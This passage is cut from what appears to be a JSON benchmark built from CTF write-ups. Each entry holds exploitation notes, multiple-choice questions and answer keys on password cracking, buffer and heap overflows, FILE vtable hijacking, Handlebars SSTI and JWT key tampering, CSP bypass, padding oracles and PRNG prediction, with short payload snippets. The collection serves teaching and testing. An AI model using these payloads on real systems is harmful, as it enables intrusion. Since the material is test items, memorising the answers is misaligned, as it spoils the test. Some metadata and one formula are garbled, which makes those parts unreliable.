            "For encrypted ZIP archives encountered in challenges, when the password is not known, the combination of **zip2john** and **John The Ripper** with a well-known wordlist like **Rockyou** can be effective for brute-forcing the password. This approach is suitable when direct brute-forcing tools, such as **fcrackzip**, fail to yield results.  \nExample commands:  \nExtract hash:  \n```zip2john archive.zip > hash.txt```  \nBrute-force password:  \n```john --wordlist=rockyou.txt --format=zip hash.txt```"
        ],
        "question": [
            "When presented with a JPG image that might have additional data or files hidden within, which tool and command could be used to detect and possibly extract such embedded files? - A. Use `grep` to search for specific text patterns within the image file. - B. Use `binwalk -e candle.jpg` to extract any embedded files. - C. Use `dd if=candle.jpg of=output.zip` to directly create a ZIP file from the image. - D. Use `file candle.jpg` to change the image file format to ZIP.",
            "In a scenario where an encrypted ZIP archive is discovered during a forensic analysis, and direct brute-forcing attempts with `fcrackzip` are unsuccessful, which combination of tools and commands should be used next to attempt password cracking? - A. Use `gzip2john archive.zip > hash.txt` followed by `john --wordlist=rockyou.txt --format=zip hash.txt`. - B. Use `zip2john archive.zip > hash.txt` followed by `sudo john --format=zip hash.txt` without specifying a wordlist. - C. Use `zip2john archive.zip > hash.txt` followed by `john --wordlist=rockyou.txt --format=zip hash.txt`. - D. Use `unzip -P password archive.zip` trying common passwords manually."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "ButterFly",
        "write_up": "dataset/raw/ButterFly.md",
        "type": "pwn",
        "competition": [
            "CSCML/2020",
            "https://ctftime.org/event/1071/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When exploiting buffer overflow vulnerabilities, careful manipulation of the buffer can bypass certain restrictions, such as input length checks. Specifically, converting input characters to uppercase (`str.upper()`) after an input length check can be used to exploit situations where the transformation increases the length of the input, enabling buffer overflows despite initial restrictions. This technique relies on finding characters that expand upon case transformation, like the German \"\u00df\", which becomes \"SS\" when converted to uppercase. This can lead to overflowing a buffer if the programming logic does not account for such changes in input size after transformations.  \n   Example payload: Python script to generate `'\u00df'*16` and send it to the application.",
            "Exploiting `FILE*` structure in libc can be complex but effective for executing arbitrary code, particularly when dealing with fully protected binaries (Full RELRO, PIE, NX, and stack canaries enabled). The technique involves overwriting the `FILE*` stream's `vtable` pointer to point to a controlled or fake `vtable` with entries that can trigger arbitrary function calls, such as `system(\"/bin/sh\")`. The exploitation process requires leaking libc addresses to calculate the base address of libc in memory, constructing a fake `FILE` structure, and carefully writing this structure to memory locations where file stream pointers (`stdin`, `stdout`, `stderr`) are stored. This method is applicable for exploiting binaries that use standard I/O functions and can bypass modern security mechanisms by leveraging inherent properties of the `FILE` structure and function pointers within libc.\n   - Key steps include: leaking libc addresses, constructing a fake `FILE` structure, and overwriting a `FILE*` stream's `vtable` to point to controlled memory containing a crafted `vtable`.\n   - No specific payload provided due to complexity and scenario-specific requirements."
        ],
        "question": [
            "In a buffer overflow challenge, the program uses a restriction to limit the input to 16 characters and converts the input to uppercase after checking the length. Which character can be used to bypass the input length restriction by expanding its length upon conversion to uppercase, enabling a buffer overflow?  - A. 'a', as 'A' - B. '\u00df', as 'SS' - C. '1', as '!' - D. 'e', as 'E' ",
            "When exploiting a binary with security mechanisms like Full RELRO, PIE, NX, and stack canaries enabled, which approach can be utilized to execute arbitrary code by leveraging the `FILE*` structure in libc?  - A. Overwriting the return address on the stack. - B. Injecting shellcode into the heap. - C. Overwriting a `FILE*` stream's `vtable` to point to a controlled fake `vtable`. - D. Directly changing function pointers in the global offset table (GOT). "
        ],
        "answer": [
            "B. '\u00df', as 'SS'",
            "C. Overwriting a `FILE*` stream's `vtable` to point to a controlled fake `vtable`."
        ]
    },
    {
        "name": "Buyify",
        "write_up": "dataset/raw/Buyify.md",
        "type": "crypto",
        "competition": [
            "CSAW/2019/Quals",
            "https://ctftime.org/event/870/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When facing a Server-side Template Injection (SSTI) challenge, especially with Handlebars template engine, initial confirmation of SSTI can be quickly identified by injecting simple mathematical operations in the template, such as `{{7*7}}`. If SSTI exists, the server's error response or output will directly reflect the injection attempt, indicating template parsing capabilities.",
            "In scenarios involving JWT token handling within SSTI vulnerable applications, if the application logic allows for token manipulation or key disclosure, bypassing security measures without requiring Remote Code Execution (RCE) can be achievable. Specifically, in cases where the secret key for JWT signature verification can be overridden or disclosed via template injection, crafting a JWT with known or controlled parameters (such as price or id) enables bypassing authentication or authorization checks. Utilize deprecated JavaScript functions such as `__defineSetter__` and `__defineGetter__` within Handlebars to override object properties, enabling the manipulation of critical security parameters.\n   \nExample payload for JWT manipulation: \n```javascript\n{{#with this.__proto__ as |o|}}  \n   {{o.__defineGetter__ \"key\" toString}}  \n   {{o.__defineSetter__ \"key\" toString}}  \n{{/with}}  \n```\n\nThis payload, when injected in a Handlebars template, would set the getter and setter for any \"key\" property access on the object prototype to return or expect a string representation of the object, assisting in the manual crafting or modification of a JWT with an expected or known key."
        ],
        "question": [
            "When attempting to confirm Server-side Template Injection (SSTI) in a web application that utilizes Handlebars, what would be an immediate indication of SSTI upon submitting `{{7*7}}` in an input field being processed by Handlebars?  - A. The application returns the string \"49\" in the response. - B. The server crashes and no response is returned to the client. - C. A server error message indicates an expectation of specific tokens like 'ID', 'STRING', but received 'INVALID'. - D. The application sanitizes the input, returning it unprocessed in the response. ",
            "In the context of a web application vulnerable to Server-side Template Injection (SSTI) where JWT token manipulation is possible, which JavaScript object manipulation method is deprecated but can still be used within Handlebars templates to overwrite property accessors, enabling keys for JWT signatures to be manipulated or disclosed?  - A. Utilizing `Object.defineProperty()` to define custom getters and setters. - B. Using `Object.prototype.constructor` to access and modify the prototype chain. - C. Employing `__defineGetter__` and `__defineSetter__` to override the behavior of object property accessors. - D. Calling `Object.freeze()` to prevent further modifications to the object properties. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "bynary encoding",
        "write_up": "dataset/raw/bynary encoding.md",
        "type": "misc",
        "competition": [
            "SpaceHeroes/2023",
            "https://ctftime.org/event/1856/tasks/"
        ],
        "score": 148,
        "max_score": 1000,
        "difficulty": 0.148,
        "knowledge": [
            "In challenges involving encoding hidden within file contents, differentiating characters (such as various whitespace characters: spaces and tabs) can represent binary data. In this case, one character (e.g., space) represents binary \"0\" and another character (e.g., tab) represents binary \"1\". A potential strategy is to substitute these characters with binary digits and use a tool to convert from binary to the encoded message. Example conversion in Python:\n```python\nline = line.replace(\" \", \"0\").replace(\"\\t\", \"1\")\n```",
            "For challenges expecting binary-encoded flags, it can be beneficial to identify a known portion of the flag (e.g., the closing curly bracket) in its binary form to confirm the encoding scheme (space for \"0\" and tab for \"1\" in this context). This confirmation can help in the correct conversion of binary data back to text."
        ],
        "question": [
            "When handling a file where different types of whitespaces encode binary data, which line of Python code correctly converts spaces and tabs into '0's and '1's respectively? - A. `line = line.replaceAll(\" \", \"0\").replaceAll(\"\\t\", \"1\")` - B. `line = line.replace(\" \", \"0\").replace(\"\\t\", \"1\")` - C. `line.replace(\" \", \"0\") && line.replace(\"\\t\", \"1\")` - D. `line = line.translate({\" \": \"0\", \"\\t\": \"1\"})`",
            "In a scenario where you're decoding a binary-encoded message and you suspect the encoding scheme uses spaces for '0' and tabs for '1', what could you use to verify your decoding scheme using a known portion of the encoded message? - A. Convert a known text character to ASCII and then to binary, and compare the pattern with the spaces and tabs in the encoded message. - B. Decode a portion of the message using a different binary encoding scheme to see if it makes sense. - C. Look for the binary pattern of a known character in the expected output, like the end curly bracket, within the encoded message to confirm your scheme. - D. Write a script to automatically detect and interpret the encoding scheme based on frequency analysis of spaces and tabs."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "byte_me",
        "write_up": "dataset/raw/byte_me.md",
        "type": "crypto",
        "competition": [
            "CSAW/2019/Quals",
            "https://ctftime.org/event/870/tasks/"
        ],
        "score": 50,
        "max_score": 500,
        "difficulty": 0.1,
        "knowledge": [
            "When dealing with ECB (Electronic Codebook) encryption challenges, identify the padding method and block size to strategize the decrpytion process. In these challenges, because identical plaintext blocks are encrypted into identical ciphertext blocks and the data is processed in separate blocks, one can manipulate inputs to control block contents. This involves inputting a controlled string that, when concatenated with the flag, helps in identifying how data is segmented into blocks, thus making it easier to bruteforce the encryption byte by byte by observing changes in the ciphertext.",
            "In scenarios where a challenge adds a random string of arbitrary length to the user input before encrypting, one strategy involves sending a long, repeating string (e.g., 'a' * 64) to create a predictable pattern in the encrypted data. Then, by incrementally appending characters to the input and analyzing when the ciphertext produces repetitive blocks, you can determine the offset introduced by the random string. This knowledge assists in aligning your input correctly with the encryption block sizes, enabling the application of typical ECB decryption techniques regardless of the preappended random data length."
        ],
        "question": [
            "When attempting to strategize the decryption process for ECB encryption challenges, it is crucial to recognize the significance of which aspect of ECB's operation? - A. The fact that ECB encryption uses a random key for each block - B. The dependency of one encrypted block on the previous block's ciphertext - C. The use of identical ciphertext blocks for identical plaintext blocks of a fixed block size - D. ECB's inherent use of asymmetric keys for encrypting each block",
            "In a challenge where the encrypted data begins with a random string of arbitrary length, followed by user input and then the flag, what is the initial step to approach decryption despite not knowing the random string's length? - A. Sending a short, unique string repeatedly to quickly identify the beginning of the flag in the encrypted data - B. Sending a long string of a repeating character (e.g., 'a' * 64) to establish a predictable pattern that will later help in determining the offset caused by the random string - C. Immediately attempting to identify the flag by guessing common flag formats without interacting with the block sizes or the introduced random string - D. Bypassing the analysis of the random string by directly attacking the encryption algorithm's vulnerability"
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "B__e64",
        "write_up": "dataset/raw/B__e64.md",
        "type": "The type of this CTF challenge is **crypto**.",
        "competition": [
            "TSG/2021",
            "https://ctftime.org/event/1431/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When dealing with challenges involving Base64 encoding and a requirement to deduce the original message from a partially known encoded string, one can employ a brute-force approach based on character-by-character matching. This approach leverages the Base64 encoding redundancy where fixing the first $n$ characters of the message will also fix the first $\\left\\lfloor \\frac{4}{3}\\right\\rfloor^n$ characters of the encoded message. This allows for an iterative procedure to match known parts of the encoded message with possible original characters until the entire message is reconstructed. This method is particularly useful when the encoded message has certain known characters (denoted as non-'*') and the task is to find the original message that fits these known encoded parts.",
            "In scenarios where the goal is to identify critical parts of an encoded message to retain while masking others, an effective strategy involves calculating the entropy for each character position across multiple encoded samples of potential messages. Positions with higher entropy are considered more valuable for deciphering the original message. Therefore, one can design a mask that retains characters at high-entropy positions and masks others, ensuring the uniqueness of the masked message so it can be correctly mapped back to a single original message. This methodology is crucial when a challenge limits the amount of information that can be known about the encoded message, but there is flexibility to choose which parts of the message to reveal. In practical terms, this approach guides the creation of a mask that maximizes the probability of correctly guessing the original message with minimal known information, by focusing on revealing the parts of the message that hold the most 'information' per character based on their entropy."
        ],
        "question": [
            "In the context of decoding partially known Base64 encoded strings, which strategy is employed to incrementally match the original message to its encoded counterpart? - A. Generate all possible combinations of the message and compare each with the encoded string. - B. Decode the entire message in reverse, starting from the last known character. - C. Iteratively match the original message's characters by fixing characters sequentially and comparing it to the known encoded parts. - D. Use a hash function to match encoded parts with possible original messages. ",
            "When constructing a mask for an encoded message in a challenge where you can only know part of the message, what principle guides the decision on which characters to mask or reveal? - A. Mask characters based on their ASCII value, keeping the highest values visible. - B. Focus on revealing characters at positions with high entropy and mask the others, to ensure the uniqueness of the masked message. - C. Reveal only the characters at the beginning and end, as they contain the most information. - D. Randomly select characters to mask or reveal without following any specific pattern. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "C is G _ Ez Camel",
        "write_up": "dataset/raw/C is G _ Ez Camel.md",
        "type": "crypto",
        "competition": [
            "Securinets/2020/Quals",
            "https://ctftime.org/event/1016/tasks/"
        ],
        "score": -1.0,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "In scenarios involving ElGamal encryption, if the modulus \\(n\\) is unknown, one can recover \\(n\\) by encrypting messages with controlled values and observing the server's responses. Specifically, choose \\(m = 1\\) and a \"random\" \\(y = 1\\) to get \\(c_1 = g\\) and \\(c_2 = h\\) from the server. Then, encrypt \\(m = 4\\) with \\(y = 1\\), and use the difference between \\(4h\\) and \\(c_2\\) returned by the server to calculate \\(n = 4h - c_2\\), assuming \\(4h \\geq n\\). This method relies on manipulating the encryption of known plaintexts to expose the modulus.",
            "ElGamal's homomorphic properties can be exploited to decrypt ciphertext without the private key when having control over \\(c_2\\). If the server's \"decrypt\" functionality refuses to decrypt the original ciphertext but accepts modified \\(c_2\\) values, then:\n   - Multiplying \\(c_2\\) by a constant \\(k\\) (e.g., \\(2c_2\\)) before sending it to the server for decryption will result in the plaintext being multiplied by the same constant. The original plaintext \\(m\\) can be recovered by multiplying the server's response by the modular inverse of \\(k\\) modulo \\(n\\).\n   - Alternatively, sending \\((c_1, 1)\\) to the server for decryption and getting the inverse of \\(s\\) allows one to manually compute the decrypted message by multiplying this inverse with \\(c_2\\).\n\nExample of exploiting homomorphic property with a constant \\(k = 2\\):\n- Original ciphertext: \\((C1, C2)\\)\n- Modified request for decryption: \\((C1, 2C2)\\)\n- Server decrypts to \\(2m\\) (where \\(m\\) is the original message).\n- Compute \\(m = 2m * mod\\_inverse(2, n) \\% n\\)."
        ],
        "question": [
            "How can the modulus \\(n\\) be recovered using controlled values during ElGamal encryption if it is initially unknown? - A. Encrypt a message \\(m = 2\\) with \\(y = 1\\) and then subtract \\(c_2\\) from \\(2h\\) to obtain \\(n\\). - B. Encrypt a message \\(m = 1\\) with \\(y = 2\\), then subtract the result from \\(2g\\) to derive \\(n\\). - C. Encrypt \\(m = 1\\) and \\(y = 1\\) to get \\(g\\) and \\(h\\), then encrypt \\(m = 4\\) with \\(y = 1\\), and calculate \\(n\\) using the formula \\(n = 4h - c_2\\), provided \\(4h \\geq n\\). - D. Encrypt \\(m = 5\\) with \\(y = 1\\), use the response to calculate \\(5h - c_2\\), assuming \\(5h\\) is less than \\(n\\).",
            "Which of the following best describes a method to decrypt a ciphertext \\((C1, C2)\\) using ElGamal's homomorphic properties without the private key by modifying \\(c_2\\)? - A. Decrypt by sending \\((C1, C2 \\cdot 2)\\) to the server and then adding the modular inverse of 2 to the response to obtain the original message. - B. Send \\((C1, 2C2)\\) for decryption, and upon receiving \\(2m\\), calculate the original message \\(m\\) by multiplying it with the modular inverse of 2 modulo \\(n\\). - C. Multiply \\(c_2\\) by 3 and send for decryption, then subtract the modular inverse of 3 from the decrypted output to retrieve \\(m\\). - D. Send \\((C1, C2^2)\\) for decryption, then take the square root of the server\u2019s response under modulo \\(n\\) to recover the original message."
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "calc",
        "write_up": "dataset/raw/calc.md",
        "type": "pwn",
        "competition": [
            "ALLES/2020",
            "https://ctftime.org/event/1091/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When facing strict Content Security Policy (CSP) preventing basic injection attacks in a web environment, HTML injection can be utilized to block subresource loading by leveraging browser features. Specifically, using a preload link with an integrity attribute containing an incorrect hash will prevent the targeted script from loading. This technique is useful when needing to bypass client-side input sanitization scripts to execute arbitrary JavaScript. Example payload: `<link rel=preload as=script integrity=sha256-incorrectHash href=filter.js>` can be used to block the loading of `filter.js` if it's executed before the script tag for `filter.js`.",
            "In situations where input is being evaluated (using `eval` or similar functions) and filtered to only allow certain characters (e.g., numbers and simple arithmetic operators), consider employing JavaScript string coercion and bitwise operators to bypass filters. These techniques allow for the execution of arbitrary JavaScript despite restrictions. By crafting input that is interpreted differently upon execution, it's possible to carry out actions that were not intended by the input sanitizer. In the context of a target expecting numeric input, an attacker can use expressions that evaluate to execute JavaScript, thereby enabling techniques such as cookie theft or other Cross-Site Scripting (XSS) payloads without directly using disallowed characters. Example payload: Using arithmetic operations or encoded characters that resolve to JavaScript code upon evaluation."
        ],
        "question": [
            "In a web application assessment, an attacker discovers that the application has a strict Content Security Policy (CSP) but allows the inclusion of a script based on its integrity hash. The attacker plans to prevent this script from loading to bypass sanitization mechanisms. Which of the following HTML injections could successfully block the loading of a subresource by exploiting a feature of how browsers handle preload links with integrity attributes? - A. `<script src=\"evil.js\" integrity=\"sha384-BadHash\"></script>` - B. `<link rel=\"import\" href=\"filter.js\" integrity=\"sha256-WrongHash\">` - C. `<link rel=\"stylesheet\" href=\"style.css\" integrity=\"sha384-IncorrectHash\">` - D. `<link rel=\"preload\" as=\"script\" integrity=\"sha256-incorrectHash\" href=\"filter.js\">` ",
            "When attempting to bypass a web filter that restricts input to numbers and specific arithmetic symbols (+, -) for a parameter that is later evaluated within a JavaScript `eval` function, which technique could allow the execution of arbitrary JavaScript code without using characters directly disallowed by the filter? - A. Using comment syntax (`//`, `/* */`) to comment out the filter code. - B. Employing JavaScript string coercion and bitwise operators to construct executable code without disallowed characters. - C. Directly inserting a `<script>` tag with the desired payload. - D. Encoding the payload in Base64 and passing it to `eval` directly. "
        ],
        "answer": [
            "D.",
            "B."
        ]
    },
    {
        "name": "Califrobnication",
        "write_up": "dataset/raw/Califrobnication.md",
        "type": "reverse",
        "competition": [
            "angstrom/2020",
            "https://ctftime.org/event/982/tasks/"
        ],
        "score": 120,
        "max_score": 300,
        "difficulty": 0.4,
        "knowledge": [
            "When facing challenges involving pseudo-random functions like **strfry**, where the randomness is seeded by known or predictable values such as **current time** xor **process ID (PID)**, the sequence of operations leading to the \"randomization\" can be reversed. This allows for the recovery of the original data if both the seed values and the algorithm's behavior are well-understood. In such scenarios, brute-forcing through the range of possible seed values (derived from the time and PID range) to reverse the randomization process can lead to the retrieval of the original data. This approach requires an understanding of how the seeding process works and how to replicate the sequence of operations made by the pseudo-random function.",
            "The **memfrob()** function's encryption can be easily reversed if the byte-wise operation applied is known. Since memfrob() employs an XOR operation with a fixed numeric value (42 in this case) over the data, reversing the encryption is as simple as applying **memfrob()** again to the data. This particular characteristic highlights the importance of understanding the reversible nature of certain encryption functions, especially in CTF challenges where cryptographic operations might not be complex. This knowledge is crucial when dealing with custom encryption schemes that use basic operations such as XOR for data obfuscation."
        ],
        "question": [
            "Which of the following approaches is feasible to reverse the effects of `strfry` function utilized in encrypting a message, given that the seed for randomness is derived from predictable values like current time XOR process ID (PID)? - A. Analyzing the pattern of encryption and using standard decryption algorithms to reverse the process. - B. Purposely causing collisions in the random number generator to predict the outcomes. - C. Brute-forcing through a range of probable seed values based on the known time and PID to replicate the sequence of random operations made during encryption. - D. Implementing machine learning algorithms to predict the original order of characters before randomization.",
            "Considering the `memfrob()` function XORs each byte of data with the number 42 to encrypt or obfuscate the data, how can one reverse the encryption applied to a given piece of data? - A. Conducting a bitwise AND operation on the encrypted data with a unique key derived from the original data. - B. Applying the `memfrob()` function a second time using a different numeric value to decrypt the data. - C. Re-applying the `memfrob()` function on the encrypted data with the same numeric value (42) to decrypt it. - D. Decrypting the data requires a complex algorithm that can invert the XOR operation without knowledge of the original encryption key."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Camouflage",
        "write_up": "dataset/raw/Camouflage.md",
        "type": "misc",
        "competition": [
            "darkCON/2021",
            "https://ctftime.org/event/1250/tasks/"
        ],
        "score": 497,
        "max_score": 500,
        "difficulty": 0.994,
        "knowledge": [
            "In challenges related to hidden data in audio files, Steghide can be utilized to extract hidden files without requiring a password, as suggested by hints indicating the lack of password requirements. This approach relies on investigating the audio file for any embedded files, which is a common technique for audio steganography. The extraction command is `steghide extract -sf [audiofile]`.",
            "When a challenge involves audio steganography and provides hints towards data hidden within images extracted from audio files, tools like ARSS (Analysis & Resynthesis Sound Spectrograph) can convert bitmap images back to audio based on specifications like Sampling Rate, Bands Per Octave, pps (pulses per second?), minimum frequency, and Bits per sample. This can reveal audio clues or further data encoded within the sound spectrum of the image. The knowledge about the specifications is crucial for successful conversion and can be used to uncover hidden messages or flags in the audio file generated from the image."
        ],
        "question": [
            "When attempting to extract hidden data from an audio file where no password is mentioned, which tool and command should be used to investigate if the file contains any steganographically hidden content? - A. Use `binwalk` with the command `binwalk -e [audiofile]` to automatically extract hidden data. - B. Use `Audacity` to open the audio file and visually inspect the spectrogram for hidden data. - C. Use `steghide` with the command `steghide extract -sf [audiofile]` to extract hidden files without needing a password. - D. Use `ffmpeg` to convert the audio file into another format to reveal hidden files.",
            "Given a bitmap image extracted from an audio file with steganography, which tool and information are necessary to convert this image back to an audio file that might contain spoken words or further clues? - A. Utilize `GIMP` to manually analyze and convert the image pixels into sound waves based on generic audio conversion assumptions. - B. Apply `Adobe Photoshop` with a script that maps image color values to audio frequencies, without any specific parameters. - C. Employ `ARSS` (Analysis & Resynthesis Sound Spectrograph) with parameters such as Sampling Rate, Bands Per Octave, pps, minimum frequency, and Bits per sample to accurately convert the image to sound. - D. Use `Audacity` to import the image as raw data, guessing the encoding parameters like bitrate and audio format."
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "cancelled",
        "write_up": "dataset/raw/cancelled.md",
        "type": "pwn",
        "competition": [
            "UTCTF/2020",
            "https://ctftime.org/event/929/tasks/"
        ],
        "score": 1879,
        "max_score": 1991,
        "difficulty": 0.9437468608739327,
        "knowledge": [
            "In heap exploitation challenges, specifically when dealing with tcache and unsorted bins, exploiting off-by-one vulnerabilities can lead to arbitrary memory write or control of the metadata of heap chunks. This technique can be used to manipulate the heap's state to overlap chunks, control freed chunk pointers, and ultimately execute an arbitrary code execution attack via hooking functions like `malloc_hook` with a one_gadget. To achieve this, manipulate chunk sizes and free orders to create a desired heap layout that enables overwriting function pointers with desired addresses.",
            "In challenges that involve leaking libc addresses to bypass ASLR, one can use the partial overwrite on a pointer that is subsequently used to write to or read from a file or standard output to leak libc addresses. Specifically, manipulating the `fd` pointer of a chunk in the tcache or unsorted bin to point near a libc structure (like the `_IO_2_1_stdout_` structure) can enable one to leak libc base addresses by overwriting parts of the file structure to enforce a controlled read or write. This approach requires brute-forcing the least significant byte(s) of the target address if ASLR is enabled.\n\nExample payload to achieve libc leak via manipulating `fd` pointer and stdout structure:\n\n```python\nadd(6, \"a\", 0x538, '\\x60\\xa7') # Partial overwrite to manipulate `fd`\nadd(7, \"tcache\", 0x38, 'a')  \nadd(8, \"stdout\", 0x38, p64(0xfbad1800)+b'\\x00'*25) # Write to stdout structure to leak libc\n```"
        ],
        "question": [
            "In a heap exploitation scenario where an attacker has the ability to cause an off-by-one error affecting a chunk's size metadata, which technique would be effective to manipulate the heap into allowing for overlapping chunks and ultimately achieving arbitrary code execution?  - A. Freeing a chunk and reallocation to overlap with adjacent freed chunks. - B. Allocating large chunks until the program runs out of memory. - C. Freeing the same chunk multiple times to cause a double free vulnerability. - D. Overwriting heap metadata of adjacent chunks to prevent them from coalescing. ",
            "In a challenge that requires leaking libc addresses to bypass ASLR, which technique could be utilized effectively based on manipulating the file or standard output structure through the partial overwrite of a `fd` pointer in a tcache or unsorted bin chunk?  - A. Directly overwriting the `fd` pointer to point to a known libc address and freeing the chunk. - B. Overflowing an `fd` pointer to overwrite adjacent chunk memory without affecting the chunk's metadata. - C. Partially overwriting the `fd` pointer of a chunk to point close to a libc structure and manipulating file structures to leak addresses. - D. Using a use-after-free vulnerability to leak the `fd` pointer directly without any partial overwrite. "
        ],
        "answer": [
            "A",
            "C"
        ]
    },
    {
        "name": "Careless Padding",
        "write_up": "dataset/raw/Careless Padding.md",
        "type": "The type of this CTF challenge is **crypto**.",
        "competition": [
            "HITCON/2023/Quals",
            "https://ctftime.org/event/2019/tasks/"
        ],
        "score": 255,
        "max_score": 500,
        "difficulty": 0.51,
        "knowledge": [
            "In a challenge related to padding oracle attacks, if the plaintext data is structured in a predictable manner (e.g., JSON format with a known structure), it can be utilized to create a known plaintext block. This can assist in executing controlled manipulations, such as XORing the plaintext block with the Initialization Vector (IV) to forge a ciphertext block that decrypts to a predetermined value. This technique can be crucial for manipulating block cipher encryption when dealing with CBC mode.\n   - Example of creating a known plaintext block for manipulation: Let's assume `{'win': 'value'}` is a known structure where `value` is controllable. An attacker can XOR the known plaintext with the IV to create a ciphertext block that decrypts to a specific, predictable value.",
            "When attempting to bypass encryption and reveal plaintext bit by bit in CBC mode encryption without direct access to decryption errors or successes, understanding and leveraging padding behavior can enable the deduction of plaintext bits. To exploit padding oracle vulnerabilities for revealing bits, except the last one, manipulate the IV or one of the preceding ciphertext blocks such that the decryption process produces a padding error or success based on the manipulated value. This method relies on predictable padding behavior and can reveal up to the top 7 bits of a byte. For the least significant bit, a brute-force attack against all possible byte values can be employed to infer its value based on the presence or absence of padding errors, effectively using these outcomes as an oracle.\n   - Example approach to brute-force the last bit: For a targeted byte, create various payloads where the byte is XORed with all possible values from 0x00 to 0xFF. Observe the server's response to determine if a valid padding was achieved. This can indirectly indicate whether the modified byte matches the expected value, allowing the deduction of the last bit."
        ],
        "question": [
            "When exploiting a padding oracle attack with a predictable plaintext structure, why is it beneficial to create a known plaintext block and XOR it with the Initialization Vector (IV)? - A. It enables attackers to generate a ciphertext block that, when decrypted, results in a predictable output, facilitating further manipulation. - B. It encrypts the data with an unbreakable cipher, locking the system's access to the data. - C. It increases the complexity of the cipher, making brute-force attacks impractical. - D. It directly reveals the plaintext without the need for further cryptographic attacks.",
            "In a scenario where the attacker aims to reveal the least significant bit (LSB) of a byte in CBC mode without direct decryption feedback, which technique is most appropriate? - A. Generating payloads that XOR the byte with all possible byte values (0x00 to 0xFF) and observing padding-related responses to infer the LSB. - B. Decrypting the ciphertext directly with the private key to reveal the LSB. - C. Using a quantum computer to simultaneously test all possibilities and directly observe the LSB. - D. Sending random data to cause the server to crash, hoping it will reveal the LSB in the error message."
        ],
        "answer": [
            "A",
            "A"
        ]
    },
    {
        "name": "Casino 2",
        "write_up": "dataset/raw/Casino 2.md",
        "type": "crypto",
        "competition": [
            "TetCTF/2023",
            "https://ctftime.org/event/1842/tasks/"
        ],
        "score": 919,
        "max_score": 971,
        "difficulty": 0.9464469618949537,
        "knowledge": [
            "When dealing with pseudo-random number generators (PRNG) like the Golang `rand.Intn` in scenarios where the random output is crucial for predicting future values (such as betting or lottery systems), understanding the underlying algorithm can be instrumental. For Golang's `rand.Intn`, it involves a Lagged Fibonacci Generator which implies that the PRNG has an internal state that can be exploited if the sequence or a part of it can be observed or influenced. Essentially, knowing a series of outputs and the algorithm can help in predicting future outputs, given that the PRNG relies on its internal state which consists of the last `607` numbers. Betting on a sequence of random numbers to learn about the internal state mod some known value aids in approximating the state for prediction purposes.",
            "The strategy to exponentially increase the balance in betting systems, where outcomes are influenced by predictions on pseudo-random generation, involves dividing the balance into several equal parts and betting a fraction of it each time. By betting fractions like `1/10th` of the balance and winning, substantial gains are garnered. Even in loss scenarios, maintaining a fraction of the balance ensures that one can continue betting without depleting resources completely. This method leverages the probabilistic winning to exponentially increase the balance by making calculated bets based on predicted outcomes. This approach showcases how strategic betting based on predictions and maintaining a safety net in the form of a balance fraction can work together to significantly amplify gains over time."
        ],
        "question": [
            "In a betting system where you need to predict the next number in a sequence generated by Golang's `rand.Intn`, understanding the PRNG's internal mechanics is crucial. Based on the scenario where the PRNG is a Lagged Fibonacci Generator and its internal state consists of the last 607 numbers, which of the following methods would be effective in approximating the PRNG's future outputs? - A. Monitoring and analyzing CPU usage patterns to predict the next number. - B. Betting on a sequence of numbers to learn about the internal state mod 2023, thereby approximating it for prediction purposes. - C. Decrypting the communications between the server and client to intercept the next number. - D. Reverse engineering the Go compiler to understand how `rand.Intn` generates its numbers.",
            "In the context of increasing your balance in a casino game that relies on prediction of pseudo-randomly generated outcomes, which strategy outlines a viable approach to exponentially grow your balance while maintaining a security net to mitigate total loss? - A. Allocating the entire balance on a single high-risk, high-reward bet to maximize the potential return quickly. - B. Betting random fractions of your balance without any predictive strategy to diversify the risk. - C. Betting 1/10th of your initial balance several times and using predicted outcomes to win, ensuring that even in a series of losses, a fraction of the balance is preserved to continue betting. - D. Only betting the minimum amount required to participate in the game, hoping for a large, unpredictable payout."
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "Cat Me if You Can",
        "write_up": "dataset/raw/Cat Me if You Can.md",
        "type": "misc",
        "competition": [
            "HackPack/2023",
            "https://ctftime.org/event/1893/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "When faced with a scenario where traditional commands to read a file (like `cat`) do not work as expected on a Unix/Linux system, alternative file reading techniques can be explored. One such technique is Bash's command substitution which allows the contents of a file to be expanded and used directly in the shell. This can be particularly useful in restricted shell environments or when the executable permissions on traditional file reading commands have been altered to prevent their direct usage.\n\n   Example command using command substitution to read a file: `echo $(< filename.txt)`",
            "Understanding and leveraging Bash features can provide unconventional ways to bypass restrictions imposed in a shell environment. Bash's command substitution (`$(< file)`) can be used to directly execute the contents of a file or to bypass restrictions on file reading commands by executing the content as part of an echo command, even when direct execution or reading is not allowed. This approach emphasizes the importance of knowing different Linux shells' features and capabilities, particularly when troubleshooting or navigating through restricted access contexts.\n\n   Example command demonstrating direct content execution through command substitution without echo: `$(< filename.txt)`"
        ],
        "question": [
            "In an environment where the `cat` command is not permissible due to unknown reasons, and you need to read the contents of `flag.txt`, which of the following alternatives adheres to the Bash's command substitution technique and can successfully display the contents of the file? - A. `grep '' flag.txt` - B. `echo $(< flag.txt)` - C. `more flag.txt` - D. `tail -n +1 flag.txt`",
            "When attempting to examine or utilize the contents of a file named `filename.txt` in a shell that restricts direct execution or conventional reading methods, which of the following commands correctly demonstrates how to bypass such restrictions using Bash's command substitution to execute or display its contents without explicitly echoing it? - A. `cat $(filename.txt)` - B. `source filename.txt` - C. `$(< filename.txt)` - D. `exec filename.txt`"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
